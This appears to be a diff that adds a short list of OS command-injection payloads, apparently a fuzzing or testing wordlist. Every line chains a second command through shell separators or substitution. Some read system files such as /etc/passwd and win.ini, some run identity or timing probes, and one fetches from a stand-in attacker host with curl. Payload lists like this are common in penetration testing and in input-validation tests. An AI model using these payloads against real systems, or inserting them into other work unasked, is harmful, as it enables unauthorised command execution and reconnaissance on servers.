@@ -1,0 +1,15 @@
+; ls -la
+| cat /etc/passwd
+`whoami`
+$(id)
+; id
+& whoami
+&& uname -a
+|| ping -c 1 127.0.0.1
+; sleep 5
+`sleep 5`
+$(curl http://attacker.com)
+; netstat -an
+| dir
+& type C:\windows\win.ini
+; cat /proc/version
